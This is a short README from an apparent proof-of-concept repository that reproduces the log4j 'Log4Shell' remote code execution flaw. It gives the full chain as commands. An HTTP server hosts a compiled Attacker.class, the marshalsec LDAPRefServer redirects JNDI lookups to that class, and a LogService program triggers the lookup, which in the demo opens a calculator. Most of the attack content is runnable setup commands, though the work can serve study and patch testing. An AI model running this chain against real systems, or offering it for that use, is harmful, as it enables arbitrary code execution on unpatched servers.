# log4j RCE 0-day exploit reproduce

[中文](https://github.com/Cyronlee/log4j-rce/blob/main/README-zh.md)

## Prepare

The `remote/Attacker.class` is already compiled with `Java 1.8.0_292`.

You can use `javac Attacker.java` to compile it if you're using another version.

## Reproduce Steps

Total of 3 processes are required to reproduce it. 

If Successfully triggered, 

The console will print `Constructor` and the calculator will be opened automatically.

### 1 Attacker service

Use `python` to host `Attacker.class` file:

```
cd remote

python -m http.server 8888
```

### 2 jndi forwarding

Use the `marshalsec` tool to forward jndi requests to the attacker's service:

```
git clone git@github.com:mbechler/marshalsec.git

cd marshalsec

mvn clean package -DskipTests

java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Attacker"
```

### 3 Trigger

Use the command line or IDE to run `src/main/java/LogService.java`
